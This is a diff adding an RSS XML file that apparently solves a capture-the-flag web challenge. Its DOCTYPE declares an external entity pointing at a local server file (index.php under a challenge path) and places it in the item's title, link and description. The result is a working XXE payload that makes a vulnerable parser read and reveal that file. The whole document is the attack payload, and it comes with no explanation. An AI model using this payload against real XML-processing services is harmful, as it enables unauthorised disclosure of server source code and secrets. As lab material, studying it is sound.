@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE rss [
+  <!ENTITY file SYSTEM "file:///challenge/web-serveur/ch29/index.php"> ]>
+<rss version="2.0">
+  <channel>
+    <item>
+      <title>&file;</title>
+      <link>&file;</link>
+      <description>&file;</description>
+    </item>
+  </channel>
+</rss>
